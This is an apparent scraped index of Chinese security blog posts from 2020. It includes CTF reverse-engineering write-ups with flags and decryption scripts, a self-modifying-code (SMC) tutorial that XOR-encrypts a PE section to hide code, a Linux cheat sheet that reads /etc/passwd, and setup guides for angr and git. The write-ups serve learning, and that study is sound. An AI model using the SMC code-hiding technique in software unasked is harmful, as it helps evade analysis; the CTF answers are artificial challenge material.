这个题做得可以说是相当没有体验了，看到一堆闪瞎狗眼的东西后立马就滚回去补作业了\n观赏了表哥们的wp后我才发现那堆x才是二维码的本体（我一直以为色块是二维码的组成部分）\n中间产生随机数来确定要不要打印x，所以把随机数判断部分patch掉就好了\n为防止手贱前面的屏幕刷新patch掉\n然后运行就会得到这种东西\n复制出来扫一下\n`BJD{TW1NKLE_TW1NKLE_L1TTLE_5TAR}\n宁是来出misc的吧\nlog1cal # 拖进ida动调一下先判断格式和长度\nBJD{64个字符}\n然后后面的位移操作没什么难的，只有重点在加密上面\n头皮发麻的加密： # for ( i = 0; i \u0026lt;= 63; ++i ) { *flag = flag[1] \u0026amp; ~(((*flag \u0026lt;\u0026lt; 28) \u0026amp; ~((*flag \u0026gt;\u0026gt; 36) \u0026amp; (*flag \u0026lt;\u0026lt; 28)) | ~((*flag \u0026gt;\u0026gt; 36) \u0026amp; (*flag \u0026lt;\u0026lt; 28)) \u0026amp; (*flag \u0026gt;\u0026gt; 36)) \u0026amp; flag[1]) | ~(((*flag \u0026lt;\u0026lt; 28) \u0026amp; ~((*flag \u0026gt;\u0026gt; 36) \u0026amp; (*flag \u0026lt;\u0026lt; 28)) | ~((*flag \u0026gt;\u0026gt; 36) \u0026amp; (*flag \u0026lt;\u0026lt; 28)) \u0026amp; (*flag \u0026gt;\u0026gt; 36)) \u0026amp; flag[1]) \u0026amp; ((*flag \u0026lt;\u0026lt; 28) \u0026amp; ~((*flag \u0026gt;\u0026gt; 36) \u0026amp; (*flag \u0026lt;\u0026lt; 28)) | ~((*flag \u0026gt;\u0026gt; 36) \u0026amp; (*flag \u0026lt;\u0026lt; 28)) \u0026amp; (*flag \u0026gt;\u0026gt; 36)); flag[1] = flag[2] \u0026amp; ~(((flag[1] \u0026lt;\u0026lt; 22) \u0026amp; ~((flag[1] \u0026gt;\u0026gt; 42) \u0026amp; (flag[1] \u0026lt;\u0026lt; 22)) | ~((flag[1] \u0026gt;\u0026gt; 42) \u0026amp; (flag[1] \u0026lt;\u0026lt; 22)) \u0026amp; (flag[1] \u0026gt;\u0026gt; 42)) \u0026amp; flag[2]) | ~(((flag[1] \u0026lt;\u0026lt; 22) \u0026amp; ~((flag[1] \u0026gt;\u0026gt; 42) \u0026amp; (flag[1] \u0026lt;\u0026lt; 22)) | ~((flag[1] \u0026gt;\u0026gt; 42) \u0026amp; (flag[1] \u0026lt;\u0026lt; 22)) \u0026amp; (flag[1] \u0026gt;\u0026gt; 42)) \u0026amp; flag[2]) \u0026amp; ((flag[1] \u0026lt;\u0026lt; 22) \u0026amp; ~((flag[1] \u0026gt;\u0026gt; 42) \u0026amp; (flag[1] \u0026lt;\u0026lt; 22)) | ~((flag[1] \u0026gt;\u0026gt; 42) \u0026amp; (flag[1] \u0026lt;\u0026lt; 22)) \u0026amp; (flag[1] \u0026gt;\u0026gt; 42)); flag[2] = flag[3] \u0026amp; ~(((flag[2] \u0026lt;\u0026lt; 16) \u0026amp; ~((flag[2] \u0026gt;\u0026gt; 48) \u0026amp; (flag[2] \u0026lt;\u0026lt; 16)) | ~((flag[2] \u0026gt;\u0026gt; 48) \u0026amp; (flag[2] \u0026lt;\u0026lt; 16)) \u0026amp; (flag[2] \u0026gt;\u0026gt; 48)) \u0026amp; flag[3]) | ~(((flag[2] \u0026lt;\u0026lt; 16) \u0026amp; ~((flag[2] \u0026gt;\u0026gt; 48) \u0026amp; (flag[2] \u0026lt;\u0026lt; 16)) | ~((flag[2] \u0026gt;\u0026gt; 48) \u0026amp; (flag[2] \u0026lt;\u0026lt; 16)) \u0026amp; (flag[2] \u0026gt;\u0026gt; 48)) \u0026amp; flag[3]) \u0026amp; ((flag[2] \u0026lt;\u0026lt; 16) \u0026amp; ~((flag[2] \u0026gt;\u0026gt; 48) \u0026amp; (flag[2] \u0026lt;\u0026lt; 16)) | ~((flag[2] \u0026gt;\u0026gt; 48) \u0026amp; (flag[2] \u0026lt;\u0026lt; 16)) \u0026amp; (flag[2] \u0026gt;\u0026gt; 48)); flag[3] = flag[4] \u0026amp; ~(((flag[3] \u0026lt;\u0026lt; 58) \u0026amp; ~((flag[3] \u0026gt;\u0026gt; 6) \u0026amp; (flag[3] \u0026lt;\u0026lt; 58)) | ~((flag[3] \u0026gt;\u0026gt; 6) \u0026amp; (flag[3] \u0026lt;\u0026lt; 58)) \u0026amp; (flag[3] \u0026gt;\u0026gt; 6)) \u0026amp; flag[4]) | ~(((flag[3] \u0026lt;\u0026lt; 58) \u0026amp; ~((flag[3] \u0026gt;\u0026gt; 6) \u0026amp; (flag[3] \u0026lt;\u0026lt; 58)) | ~((flag[3] \u0026gt;\u0026gt; 6) \u0026amp; (flag[3] \u0026lt;\u0026lt; 58)) \u0026amp; (flag[3] \u0026gt;\u0026gt; 6)) \u0026amp; flag[4]) \u0026amp; ((flag[3] \u0026lt;\u0026lt; 58) \u0026amp; ~((flag[3] \u0026gt;\u0026gt; 6) \u0026amp; (flag[3] \u0026lt;\u0026lt; 58)) | ~((flag[3] \u0026gt;\u0026gt; 6) \u0026amp; (flag[3] \u0026lt;\u0026lt; 58)) \u0026amp; (flag[3] \u0026gt;\u0026gt; 6)); flag[4] = flag[5] \u0026amp; ~(((flag[4] \u0026lt;\u0026lt; 52) \u0026amp; ~((flag[4] \u0026gt;\u0026gt; 12) \u0026amp; (flag[4] \u0026lt;\u0026lt; 52)) | ~((flag[4] \u0026gt;\u0026gt; 12) \u0026amp; (flag[4] \u0026lt;\u0026lt; 52)) \u0026amp; (flag[4] \u0026gt;\u0026gt; 12)) \u0026amp; flag[5]) | ~(((flag[4] \u0026lt;\u0026lt; 52) \u0026amp; ~((flag[4] \u0026gt;\u0026gt; 12) \u0026amp; (flag[4] \u0026lt;\u0026lt; 52)) | ~((flag[4] \u0026gt;\u0026gt; 12) \u0026amp; (flag[4] \u0026lt;\u0026lt; 52)) \u0026amp; (flag[4] \u0026gt;\u0026gt; 12)) \u0026amp; flag[5]) \u0026amp; ((flag[4] \u0026lt;\u0026lt; 52) \u0026amp; ~((flag[4] \u0026gt;\u0026gt; 12) \u0026amp; (flag[4] \u0026lt;\u0026lt; 52)) | ~((flag[4] \u0026gt;\u0026gt; 12) \u0026amp; (flag[4] \u0026lt;\u0026lt; 52)) \u0026amp; (flag[4] \u0026gt;\u0026gt; 12)); flag[5] = flag[6] \u0026amp; ~(((flag[5] \u0026lt;\u0026lt; 46) \u0026amp; ~((flag[5] \u0026gt;\u0026gt; 18) \u0026amp; (flag[5] \u0026lt;\u0026lt; 46)) | ~((flag[5] \u0026gt;\u0026gt; 18) \u0026amp; (flag[5] \u0026lt;\u0026lt; 46)) \u0026amp; (flag[5] \u0026gt;\u0026gt; 18)) \u0026amp; flag[6]) | ~(((flag[5] \u0026lt;\u0026lt; 46) \u0026amp; ~((flag[5] \u0026gt;\u0026gt; 18) \u0026amp; (flag[5] \u0026lt;\u0026lt; 46)) | ~((flag[5] \u0026gt;\u0026gt; 18) \u0026amp; (flag[5] \u0026lt;\u0026lt; 46)) \u0026amp; (flag[5] \u0026gt;\u0026gt; 18)) \u0026amp; flag[6]) \u0026amp; ((flag[5] \u0026lt;\u0026lt; 46) \u0026amp; ~((flag[5] \u0026gt;\u0026gt; 18) \u0026amp; (flag[5] \u0026lt;\u0026lt; 46)) | ~((flag[5] \u0026gt;\u0026gt; 18) \u0026amp; (flag[5] \u0026lt;\u0026lt; 46)) \u0026amp; (flag[5] \u0026gt;\u0026gt; 18)); flag[6] = flag[7] \u0026amp; ~(((flag[6] \u0026lt;\u0026lt; 40) \u0026amp; ~((flag[6] \u0026gt;\u0026gt; 24) \u0026amp; (flag[6] \u0026lt;\u0026lt; 40)) | ~((flag[6] \u0026gt;\u0026gt; 24) \u0026amp; (flag[6] \u0026lt;\u0026lt; 40)) \u0026amp; (flag[6] \u0026gt;\u0026gt; 24)) \u0026amp; flag[7]) | ~(((flag[6] \u0026lt;\u0026lt; 40) \u0026amp; ~((flag[6] \u0026gt;\u0026gt; 24) \u0026amp; (flag[6] \u0026lt;\u0026lt; 40)) | ~((flag[6] \u0026gt;\u0026gt; 24) \u0026amp; (flag[6] \u0026lt;\u0026lt; 40)) \u0026amp; (flag[6] \u0026gt;\u0026gt; 24)) \u0026amp; flag[7]) \u0026amp; ((flag[6] \u0026lt;\u0026lt; 40) \u0026amp; ~((flag[6] \u0026gt;\u0026gt; 24) \u0026amp; (flag[6] \u0026lt;\u0026lt; 40)) | ~((flag[6] \u0026gt;\u0026gt; 24) \u0026amp; (flag[6] \u0026lt;\u0026lt; 40)) \u0026amp; (flag[6] \u0026gt;\u0026gt; 24)); flag[7] = *flag \u0026amp; ~(((flag[7] \u0026lt;\u0026lt; 34) \u0026amp; ~((flag[7] \u0026gt;\u0026gt; 30) \u0026amp; (flag[7] \u0026lt;\u0026lt; 34)) | ~((flag[7] \u0026gt;\u0026gt; 30) \u0026amp; (flag[7] \u0026lt;\u0026lt; 34)) \u0026amp; (flag[7] \u0026gt;\u0026gt; 30)) \u0026amp; *flag) | ~(((flag[7] \u0026lt;\u0026lt; 34) \u0026amp; ~((flag[7] \u0026gt;\u0026gt; 30) \u0026amp; (flag[7] \u0026lt;\u0026lt; 34)) | ~((flag[7] \u0026gt;\u0026gt; 30) \u0026amp; (flag[7] \u0026lt;\u0026lt; 34)) \u0026amp; (flag[7] \u0026gt;\u0026gt; 30)) \u0026amp; *flag) \u0026amp; ((flag[7] \u0026lt;\u0026lt; 34) \u0026amp; ~((flag[7] \u0026gt;\u0026gt; 30) \u0026amp; (flag[7] \u0026lt;\u0026lt; 34)) | ~((flag[7] \u0026gt;\u0026gt; 30) \u0026amp; (flag[7] \u0026lt;\u0026lt; 34)) \u0026amp; (flag[7] \u0026gt;\u0026gt; 30)); v6 = 1; } 但是我们把每一个算式拆成下面的形式：\na = flag\u0026lt;\u0026lt;n1 b = flag\u0026gt;\u0026gt;n2 *flag = flag[1] \u0026amp; ~((a \u0026amp; ~(b \u0026amp; a) | ~(b \u0026amp; a) \u0026amp; b) \u0026amp; flag[1]) | ~((a \u0026amp; ~(b \u0026amp; a) | ~(b \u0026amp; a) \u0026amp; b) \u0026amp; flag[1]) \u0026amp; (a \u0026amp; ~(b \u0026amp; a) | ~(b \u0026amp; a) \u0026amp; b); 可以发现(a \u0026amp; ~(b \u0026amp; a) | ~(b \u0026amp; a) \u0026amp; b)是作为一个整体出现的，得到的结果就是 a^b 的值 化简后\n*flag = flag[1] \u0026amp; ~((a^b)\u0026amp; flag[1]) | ~((a^b) \u0026amp; flag[1]) \u0026amp; (a^b);\n又发现整个算式就是刚才的那个结构，于是把加密进行简化为\nflag[0]=(a^b)^flag[1]\n再加之a和b的两个位移指正好是64，这样就可以开始逆了\nDemo: # import hashlib l = [0x08CD53D0EAE56FDE,0xE0310C8244BA1FA3,0x45B42002CE1B213D,0x16FDC411224CB2DF,0x2FD8108A59461BCC,0x8F6990725EB01982,0x9BA5ADE29A2A17D8,0x4DEAA99F5D9F6605] n1 = [] n2 = [] for i in range(64): l[7] = ((l[7] ^ l[0]) \u0026gt;\u0026gt; 34) \u0026amp; 0xffffffffffffffff ^ (((l[7] ^ l[0])) \u0026lt;\u0026lt; 30) \u0026amp; 0xffffffffffffffff l[6] = ((l[6] ^ l[7]) \u0026gt;\u0026gt; 40) \u0026amp; 0xffffffffffffffff ^ (((l[6] ^ l[7])) \u0026lt;\u0026lt; 24) \u0026amp; 0xffffffffffffffff l[5] = ((l[5] ^ l[6]) \u0026gt;\u0026gt; 46) \u0026amp; 0xffffffffffffffff ^ (((l[5] ^ l[6])) \u0026lt;\u0026lt; 18) \u0026amp; 0xffffffffffffffff l[4] = ((l[4] ^ l[5]) \u0026gt;\u0026gt; 52) \u0026amp; 0xffffffffffffffff ^ (((l[4] ^ l[5])) \u0026lt;\u0026lt; 12) \u0026amp; 0xffffffffffffffff l[3] = ((l[3] ^ l[4]) \u0026gt;\u0026gt; 58) \u0026amp; 0xffffffffffffffff ^ (((l[3] ^ l[4])) \u0026lt;\u0026lt; 6) \u0026amp; 0xffffffffffffffff l[2] = ((l[2] ^ l[3]) \u0026gt;\u0026gt; 16) \u0026amp; 0xffffffffffffffff ^ (((l[2] ^ l[3])) \u0026lt;\u0026lt; 48) \u0026amp; 0xffffffffffffffff l[1] = ((l[1] ^ l[2]) \u0026gt;\u0026gt; 22) \u0026amp; 0xffffffffffffffff ^ (((l[1] ^ l[2])) \u0026lt;\u0026lt; 42) \u0026amp; 0xffffffffffffffff l[0] = ((l[0] ^ l[1]) \u0026gt;\u0026gt; 28) \u0026amp; 0xffffffffffffffff ^ (((l[0] ^ l[1])) \u0026lt;\u0026lt; 36) \u0026amp; 0xffffffffffffffff s=\u0026#39;\u0026#39; for i in l: t = i while t\u0026gt;0: s+=chr(t%0x100) t = t//0x100 flag =\u0026#39;\u0026#39; s1 = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39; s2 = \u0026#39;456789+/YZabcdefopqrstuvwxyz0123ghijklmnABCDEFGHQRSTUVWXIJKLMNOP\u0026#39; for i in s1: flag += s[s2.find(i)] print(flag) # easy_logical_algorithm_for_freshman_and_try_to_slove_it_yourself m=hashlib.md5() m.update(bytes(flag,encoding=\u0026#34;utf-8\u0026#34;)) print(m.hexdigest().upper()) #A6FFB35FEF107F2A0DAAE19BCD7B2297 其实在看到加密部分只有与、或、非的时候就应该往与、或、非实现异或的方向想了，因为没有加减乘除的参与，单纯的与、或、非很难把flag逆回来\nPy2 # pyc文件很完整,可以直接用工具反出来,拿到源码是这样的\ndemo： # #! /usr/bin/env python 2.7 (62211) #coding=utf-8 # Compiled at: 2020-04-23 03:22:50 #Powered by BugScaner #http://tools.bugscaner.com/ #如果觉得不错,请分享给你朋友使用吧! import ctypes from base64 import b64encode, b64decode def decode(): fd = open(\u0026#39;./libc.so\u0026#39;, \u0026#39;rb\u0026#39;) data = fd.read() fd.close() print(123) fd = open(\u0026#39;./libc.so\u0026#39;, \u0026#39;wb\u0026#39;) fd.write(b64decode(data)) fd.close() def check(): if b64encode(pwd) == \u0026#39;YmpkMw==\u0026#39;: # bjd3 decode() dl = ctypes.cdll.LoadLibrary lib = dl(\u0026#39;./libc.so\u0026#39;) reply = lib.check reply(int(flag[:length // 2], 16), int(flag[length // 2:], 16), int(pwd.encode(\u0026#39;hex\u0026#39;), 16)) print \u0026#39;your input is BJD\u0026#39; flag.decode(\u0026#39;hex\u0026#39;) else: print \u0026#39;your password is wrong!\u0026#39; if __name__ == \u0026#39;__main__\u0026#39;: print \u0026#39;Please input your flag:\u0026#39; flag = raw_input() flag = flag.encode(\u0026#39;hex\u0026#39;) length = len(flag) print \u0026#39;Please input your password:\u0026#39; pwd = raw_input() check() #decode() 分析一下流程可以发现代码调用了 libc.so 动态链接库里面的cheak函数进行加密\npy源码好就好在可以对流程随意修改,我们让程序对文件解base64后得到 libc.so里面的cheak函数是长这样的\ncheak函数 # v3 = a1; v7 = a2; v6 = a2; v5 = a2; v4 = a2; code((unsigned __int64 *)\u0026amp;v3, \u0026amp;v4); if ( v3 == __PAIR128__(0xD760262509C2F6D0LL, 0xAF9D869B6947017DLL) ) puts(\u0026#34;you win!\u0026#34;); else puts(\u0026#34;you failed!\u0026#34;); code函数: # v4 = *a1; v5 = a1[1]; sum = 0LL; v7 = 32LL; while ( 1 ) { v2 = v7--; if ( !v2 ) break; sum += 0x9E3779B9LL; v4 += (v5 + sum) ^ (16 * v5 + *key) ^ ((v5 \u0026gt;\u0026gt; 5) + key[1]); v5 += (v4 + sum) ^ (16 * v4 + key[2]) ^ ((v4 \u0026gt;\u0026gt; 5) + key[3]); } *a1 = v4; code函数内是标准的tea加密,早知道加密方式这么简单我就先来做py2了。。。\n但是反出来的这行代码又很奇怪if ( v3 == __PAIR128__(0xD760262509C2F6D0LL, 0xAF9D869B6947017DLL) )于是干脆看汇编确定判断时的细节\n可以确定\n0xAF9D869B6947017D,0xD760262509C2F6D0\n对应第1、2个flag\ntea的解密脚本很好写，但是要注意题目用的是64位int\nexp: # #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;iomanip\u0026gt; using namespace std; void decrypt(unsigned __int64 *v, unsigned __int64 *k) { unsigned __int64 v4 = v[0], v5 = v[1], v2 = v[2], v3 = v[3], sum = 0; unsigned __int64 k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; for (int i = 0; i \u0026lt; 32; i++) { sum += 0x9E3779B9; } for (int i = 0; i \u0026lt; 32; i++) { v5 -= ((v4 * 16) + k2) ^ (v4 + sum) ^ ((v4 \u0026gt;\u0026gt; 5) + k3); v4 -= ((v5 * 16) + k0) ^ (v5 + sum) ^ ((v5 \u0026gt;\u0026gt; 5) + k1); sum -= 0x9E3779B9; } v[0] = v4; v[1] = v5; } int main() { unsigned __int64 flag[2] = { 0xAF9D869B6947017D,0xD760262509C2F6D0}; unsigned __int64 key[4] = {0x626a6433, 0x626a6433, 0x626a6433, 0x626a6433}; decrypt(flag, key); for (auto \u0026amp;\u0026amp;i : flag) { cout \u0026lt;\u0026lt; hex \u0026lt;\u0026lt; i\u0026lt;\u0026lt; endl; } system(\u0026#34;pause\u0026#34;); return 0; } //676f745f //74656121 把结果转成字符串\ngot_tea!\n这几个re除了两个misc确实难度感觉都比较适中。。。应该把所有题都看一遍的\n","date":"26 May 2020","permalink":"/achieve/2019to2021/dasctf-2020-5/","section":"archive","summary":"我就是铁废物了，整场比赛只做出来两个题","title":"安恒五月赛-2020-re部分"},{"content":"\rVC6实现SMC动态代码加密技术 # 自己做re经常碰到smc，折腾久了也会手痒痒自己弄一个，算是对PE结构的巩固。。。技术本身也不太难懂，折腾完发现也没弄出啥有技术含量的东西，就算作学习加密技术的一个开端吧\n预备知识： # pe结构\nC语言功底\n添加区块： # 相对汇编编写smc，C语言编写smc一大缺点就是难以准确定位到某个函数，所以要用到添加段的操作，以区块为加密单位，所以讲要加密的代码放到一个新区块中\n#pragma code_seg(\u0026#34;.SMC\u0026#34;) void fun() {\tputs(\u0026#34;You got my secrets =.= \\n\u0026#34;); } #pragma code_seg() #pragma comment(linker, \u0026#34;/SECTION:.SMC,ERW\u0026#34;) #pragma code_seg(\u0026quot;.SMC\u0026quot;) 表示将代码放入 .SMC 段中\n后面还要跟一个 #pragma code_seg( ) 是为了把其余代码放入原本的段中\n#pragma comment(linker, \u0026ldquo;/SECTION:.SMC,ERW\u0026rdquo;) 设置段的属性位可读写，没有这一步也可以用 VirtualProtect 进行修改\n运行程序应该看到fun()是可以正常运行的,若使用 vs20xx 可能需要修改一下编译的设置才能成功生成新段\n定位区块： # 首先需要定位到镜像文件的基址\nHMODULE pBuf = GetModuleHandle(0); 通过基找到程序的 DOS 头(PIMAGE_DOS_HEADER 类型)，再通过 DOS 头找到 PE 文件头(PIMAGE_NT_HEADERS32 类型)：\npDH = (PIMAGE_DOS_HEADER)pBuf; pNtH = (PIMAGE_NT_HEADERS32)((DWORD)pBuf + pDH-\u0026gt;e_lfanew); 利用 PE 文件头找到第一个段和段的总数：\nSnum = pNtH-\u0026gt;FileHeader.NumberOfSections; pSH = IMAGE_FIRST_SECTION(pNtH); 通过遍历每 Snum 个段对比段的 name 就可以定位到想要的段了。\n集合上述方法编写了一个查找指定区段的函数：\nPIMAGE_SECTION_HEADER get_SH(char s[]) { char name[10]; int Snum; HMODULE pBase = GetModuleHandle(0); PIMAGE_DOS_HEADER pDH; PIMAGE_NT_HEADERS pNtH; PIMAGE_SECTION_HEADER pSH; pDH = (PIMAGE_DOS_HEADER)pBase; pNtH = (PIMAGE_NT_HEADERS32)((DWORD)pBase + pDH-\u0026gt;e_lfanew); Snum = pNtH-\u0026gt;FileHeader.NumberOfSections; pSH = IMAGE_FIRST_SECTION(pNtH); for(int i = 0;i\u0026lt;Snum;i++) { memset(name,0,sizeof(name)); memcpy(name,pSH-\u0026gt;Name,8); if(strcmp(name,s)==0) return pSH; pSH++; } cout\u0026lt;\u0026lt;\u0026#34;sth worry!\\n\u0026#34;; system(\u0026#34;pause\u0026#34;); return pSH; } 对代码进行操作： # 对代码的操作有一点麻烦，用上面得到的目标段得到段首的偏移再加上映像文件的基址得到定位到真正的段首地址。\n然后先把代码开始的位置转成一个 void 类型的指针，再把数据转成 BYTE 类型输出。\nvoid axor(void *soure,int len,int key) {\tprintf(\u0026#34;读取数据：\\n\u0026#34;); for(int i=0;i\u0026lt;len;i++) printf(\u0026#34;%X\\n\u0026#34;,*((BYTE*)soure+i));//*((BYTE*)soure+i) = *((BYTE*)soure+i) ^ key; }//段操作函数 . . . . void *Start = GetModuleHandle(0) + SH-\u0026gt;VirtualAddress; int size = SH-\u0026gt;SizeOfRawData; axor( soure, size, 4396)；//代码长度可能只占段很小一部分,所以 size 的值视情况而定 打印出来颇有一种一位位读取机器码的效果。\n编写赋值语句尝试对机器码的值进行修改，动调查看流程确认无误后加入 key 对代码进行加密\nvoid axor(void *soure,int len,int key {\tfor(int i=0;i\u0026lt;len;i++) *((BYTE*)soure+i) = *((BYTE*)soure+i) ^ key; } 利用异或以外的加密方式可以提高 smc 的威力\n把各个步骤整合到一起，编译\n但是编译好的代码并没有对敏感代码进行加密，于是我们还需要直接对生成好的 pe 文件动刀，方法也很简单，只有找到位置一个个 BYTE 改就ok了，这里我做了一个读取文件的 demo ，因为代码不太长，所以试了试直接用 winhex 一位位抠也是可行的。。。。\n最后把写好的程序放在这里：\rsmc1 密码是：2077 smc 还是要配合上其他加密算法和保护手段才能发挥其真正威力，回头看自己折腾出来的代码总觉得很幼稚。。。\n参考资料： # 《加密与解密 第四版》11章 https://bbs.pediy.com/thread-201708.htm https://blog.csdn.net/orbit/article/details/1497457\n","date":"9 May 2020","permalink":"/achieve/2019to2021/%E4%B8%80%E6%AC%A1smc%E7%9A%84%E5%AE%9E%E7%8E%B0/","section":"archive","summary":"VC6实现SMC动态代码加密技术 # 自己做re经常碰到smc，折腾久了也会手痒痒自己弄一个，算是对PE结构的巩固。。。技术本身也不太难懂，折腾完发现也没弄出啥有技术含量的东西，就算作学习加密技术的一个开端吧","title":"一次SMC的实现"},{"content":"\r一些（最近用到的）常用指令： # 没事不想用vim : (\nls -i详细信息显示 [路径(默认当前目录)] -a隐藏文件显示 -h大小按kb显示 A*.txt 搜索A开头.txt结尾的文件 #对文件： mv 1 1.txt #1 改为 1.txt #对文件夹： mv fld fld2#若fld2存在则移动fld到fld2下，否则改名为fld2 whereis xxxxx #查找文件位置 vim [文件名] 命令(一般)模式下： i #进入编辑模式 shift + `：`#打开底部命令行 / #按下后输入字符串可以匹配字符串 gg #回第一行 shift + x #类似windows的backspace dd #行消除 yy #复制本行 shift + p #粘贴在光标上一行 p #粘贴在光标下一行 u #类似ctrl + z [输入数字n] + 回车 #向下跳n行 ctrl f#对应uppage ctrl b#对应downpage #多行注释 ctrl + v --\u0026gt; 选择多行并shift + i--\u0026gt; 输入字符回车---\u0026gt;字符会复制到选择起来的所有行前面 如果输入`#`或者`//`可以达到多行注释的效果 底部命令模式： ESC回到命令（一般）模式 q 退出 w 保存 q！强制退出不保存 w！强制保存 1,s/A/B/gc #从第一行开始找 A 并询问是否换成 B 询问选项：y yes n next a 光标以下的all （可能很有用） q quit 编辑模式： inster #在替换和插入之间切换 添加环境变量： export PATH=[path] //不需要括号和引号 如：export PATH=$PATH:/mnt/c/Users/16953/bin/ sudo password root//重置密码 sudo -i//切换至sudo用户 chmod 777 file//权限拉满 chmod 000 file//权限全关 abc a:User b:Group c:Other 权限选项： r：读 w：写 x：执行 ubuntu config --default-user root 设置默认用户以为root w who 当前**在登陆**用户 whoami 查询当前用户 cat /etc/passwd 查看所有用户，但是很丑 lastlog 比上面那个好看一些 apt-get update // 更新安装源（Source） apt-get upgrade // 更新已安装的软件包 dist-upgrade //更新依赖 apt-cache search PackageName // 搜索软件包 ","date":"8 May 2020","permalink":"/achieve/2019to2021/%E4%B8%80%E4%BA%9Blinux%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/","section":"archive","summary":"一些（最近用到的）常用指令： # 没事不想用vim : (","title":"一些linux常用指令"},{"content":"\r在wsl上安装angr框架 # 折腾了好几天终于是把这套东西给折腾完了，windows上折腾一天最后还是无法解决报错，干脆按在了wsl上。就把从头到尾踩过的坑全部拿出来写一下好了\n先检查新装好的 wsl 有没有安装 pip ，没有的话系统会提示用apt安装。\n安装 virtualenv： # pip3 install virtualenv 在python开发中，我们可能会遇到一种情况，就是当前的项目依赖的是某一个版本，但是另一个项目依赖的是另一个版本，这样就会造成依赖冲突，而virtualenv就是解决这种情况的，virtualenv通过创建一个虚拟化的python运行环境，将我们所需的依赖安装进去的，不同项目之间相互不干扰，如下所示。\n意思就是说angr会影响python的环境所以要新建一个独立的python环境（具体是一个文件夹）\n先新建到一个angr专用文件夹：\nljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953$ mkdir angr_enviroment ljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953$ cd angr_enviroment/ 新建一个 python 独立运行环境： # virtualenv -p python位置 myenv python位置这样获得：\nljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953$ whereis python python: /usr/bin/python3.6 /usr/bin/python3.6-config /usr/bin/python3.6m /usr/bin/python3.6m-config /usr/lib/python2.7 /usr/lib/python3.6 /usr/lib/python3.7 /usr/lib/python3.8 /etc/python3.6 /usr/local/lib/python3.6 /usr/include/python3.6 /usr/include/python3.6m /usr/share/python /mnt/c/Program Files (x86)/NetSarang/Xshell 6/python34.dll /mnt/c/Program Files (x86)/NetSarang/Xshell 6/python34.zip /mnt/c/py374/python.pdb /mnt/c/py374/python3.dll /mnt/c/py374/python3.exe /mnt/c/py374/python37.dll /mnt/c/py374/python37.pdb /mnt/c/Windows/system32/python27.dll /mnt/c/p27/python2.exe /mnt/c/Users/16953/AppData/Local/Microsoft/WindowsApps/python.exe /mnt/c/Users/16953/AppData/Local/Microsoft/WindowsApps/python3.exe ljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953$ 复制粘贴第一个/usr/bin/python3.6\n具体位置可能会有差异\n运行：ljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953/bin/wslhome/angr_enviroment$ virtualenv -p /usr/bin/python3.6 myenv\n应该可以用windows资源管理器在angr_enviroment文件夹下看的一个新建的myenv文件夹，\n安装angr： # #启动环境 ljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953/bin/wslhome/angr_enviroment$ source myenv/bin/activate #安装angr (myenv) ljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953/bin/wslhome/angr_enviroment$ pip3 install angr 。 。 安 装 中 。 。 (myenv) ljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953/bin/wslhome/angr_enviroment$ python3 Python 3.6.9 (default, Apr 18 2020, 01:56:04) [GCC 8.4.0] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; import angr \u0026gt;\u0026gt;\u0026gt; #未报错则成功 #关闭环境 (myenv) ljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953/bin/wslhome/angr_enviroment$ deactivate ljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953/bin/wslhome/angr_enviroment$ 之后要使用angr的时候也要开启环境所以尽量装在wsl初始化界面附近\n对python虚拟环境的一点点解释：（感觉其实就是备份了一个拿来给特定应用折腾）\n针对每个应用创建独立运行的python环境，这样就可以对每个应用的pyhton环境进行隔离。原理就是把系统python复制一份到virtualenv的环境，用命令source venv/bin/activate进入一个virtualenv环境的时候，virtualenv会修改相关的环境变量，让命令python和pip均指向当前的virtualenv环境。这个时候命令提示符号就变了，前面有一个（venv)前缀 :3\n","date":"8 May 2020","permalink":"/achieve/2019to2021/wsl%E5%AE%89%E8%A3%85angr/","section":"archive","summary":"在wsl上安装angr框架 # 折腾了好几天终于是把这套东西给折腾完了，windows上折腾一天最后还是无法解决报错，干脆按在了wsl上。就把从头到尾踩过的坑全部拿出来写一下好了","title":"wsl安装angr"},{"content":"\r被一个很坑爹的问题折腾了一天-解决git下载速度过慢 # 碰到的问题都是比较个例的，所以才会放在博客\n几种常见的解决方案： # 1. 更改hosts文件： # 进入这个网站\r查询以下网址的 ip\ngithub.com github.global.ssl.fastly.net codeload.github.com 用cmd指令 ping 一下ip\nping xxx.xxx.xxx.xxx 如果ping得通就按以下格式添加到hosts文件中\nhosts文件位置：C:\\Windows\\System32\\drivers\\etc\n像这样：\n# Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a \u0026#39;#\u0026#39; symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost # Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a \u0026#39;#\u0026#39; symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS 